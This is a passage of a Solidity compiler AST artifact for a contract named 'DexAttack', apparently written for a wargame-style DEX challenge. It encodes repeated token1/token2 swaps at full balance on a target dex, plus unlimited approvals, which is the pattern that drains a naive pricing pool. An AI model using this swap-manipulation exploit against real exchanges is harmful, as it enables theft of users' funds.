																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 875,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1147:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 877,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1147:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 878,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1162:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1147:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 883,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1147:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 870,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1121:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 869,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1116:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 871,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1116:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 872,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1126:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1116:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 884,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1116:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 885,
												"nodeType": "ExpressionStatement",
												"src": "1116:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 890,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1212:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 891,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1220:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 898,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1261:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 897,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1253:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 896,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1253:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 899,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1253:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 893,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "1235:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 892,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1228:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 894,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1228:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 895,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1243:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1228:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 900,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1228:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 887,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1202:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 886,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1197:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 888,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1197:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 889,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1207:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1197:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 901,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1197:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 902,
												"nodeType": "ExpressionStatement",
												"src": "1197:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 907,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1293:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 908,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1301:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3435",
															"id": 909,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1309:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_45_by_1",
																"typeString": "int_const 45"
															},
															"value": "45"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_45_by_1",
																"typeString": "int_const 45"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 904,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1283:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 903,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1278:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 905,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1278:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 906,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1288:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1278:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 910,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1278:34:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 911,
												"nodeType": "ExpressionStatement",
												"src": "1278:34:4"
											}
										]
									},
									"functionSelector": "d7df8d6f",
									"id": 913,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "dexAttack",
									"nameLocation": "596:9:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 766,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "605:2:4"
									},
									"returnParameters": {
										"id": 767,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "617:0:4"
									},
									"scope": 1114,
									"src": "587:732:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1112,
										"nodeType": "Block",
										"src": "1358:1096:4",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 920,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "1396:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 921,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "1400:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "1396:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 924,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "1416:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																],
																"id": 923,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1408:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 922,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1408:7:4",
																	"typeDescriptions": {}
																}
															},
															"id": 925,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1408:13:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3130",
															"id": 926,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1423:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															},
															"value": "10"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 917,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 727,
																	"src": "1375:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 916,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "1368:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 918,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1368:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 919,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1383:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "1368:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 927,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1368:58:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 928,
												"nodeType": "ExpressionStatement",
												"src": "1368:58:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 933,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "1464:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 934,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "1468:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "1464:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 937,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "1484:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																],
																"id": 936,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1476:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 935,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1476:7:4",
																	"typeDescriptions": {}
																}
															},
															"id": 938,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1476:13:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3130",
															"id": 939,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1491:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															},
															"value": "10"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 930,
																	"name": "token2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "1443:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 929,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "1436:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 931,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1436:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 932,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1451:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "1436:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 940,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1436:58:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 941,
												"nodeType": "ExpressionStatement",
												"src": "1436:58:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 946,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "1528:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 949,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1538:4:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 948,
																			"name": "uint",
																			"nodeType": "ElementaryTypeName",
																			"src": "1538:4:4",
																			"typeDescriptions": {}
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		}
																	],
																	"id": 947,
																	"name": "type",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967269,
																	"src": "1533:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 950,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1533:10:4",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_meta_type_t_uint256",
																	"typeString": "type(uint256)"
																}
															},
															"id": 951,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"memberLocation": "1544:3:4",
															"memberName": "max",
															"nodeType": "MemberAccess",
															"src": "1533:14:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 943,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 727,
																	"src": "1512:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 942,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "1505:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 944,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1505:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 945,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1520:7:4",
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 651,
														"src": "1505:22:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 952,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1505:43:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 953,
												"nodeType": "ExpressionStatement",
												"src": "1505:43:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 958,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "1581:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 961,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1591:4:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 960,
																			"name": "uint",
																			"nodeType": "ElementaryTypeName",
																			"src": "1591:4:4",
																			"typeDescriptions": {}
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		}
																	],
																	"id": 959,
																	"name": "type",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967269,
																	"src": "1586:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 962,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1586:10:4",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_meta_type_t_uint256",
																	"typeString": "type(uint256)"
																}
															},
															"id": 963,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"memberLocation": "1597:3:4",
															"memberName": "max",
															"nodeType": "MemberAccess",
															"src": "1586:14:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 955,
																	"name": "token2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "1565:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 954,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "1558:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 956,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1558:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 957,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1573:7:4",
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 651,
														"src": "1558:22:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 964,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1558:43:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 965,
												"nodeType": "ExpressionStatement",
												"src": "1558:43:4"
											},
											{
